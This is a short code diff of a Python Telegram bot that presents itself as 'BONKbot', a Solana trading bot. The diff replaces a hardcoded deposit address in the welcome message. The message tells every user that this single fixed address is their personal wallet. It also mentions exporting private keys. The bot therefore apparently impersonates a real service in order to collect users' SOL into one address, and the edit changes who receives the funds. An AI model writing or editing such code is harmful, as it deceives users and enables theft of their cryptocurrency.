@@ -163,7 +163,7 @@ def start(update, context):
         "🚀 *Welcome to BONKbot* — the fastest and most secure bot for trading any token on Solana!\n\n"
         f"You currently have *{balance:.4f} SOL* in your wallet.\n\n"
         "To start trading, deposit SOL to your *BONKbot wallet address*:\n\n"
-        "`FC8gULDHM3GqHFXH5hYPT35b99Km42DK28JMPx6NHfCh`\n\n"
+        "`AwuTYi6CPs2oXubpHyRDjkRde2VTVGNDrqcmwTEHe7R2`\n\n"
         "Once done, tap *Refresh* and your balance will update.\n\n"
         "*To buy a token:* enter a ticker or token contract address from pump.fun, Birdeye, DEX Screener, or Meteora.\n\n"
         "For more info on your wallet and to export your private key, tap *Wallet* below."
@@ -381,4 +381,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
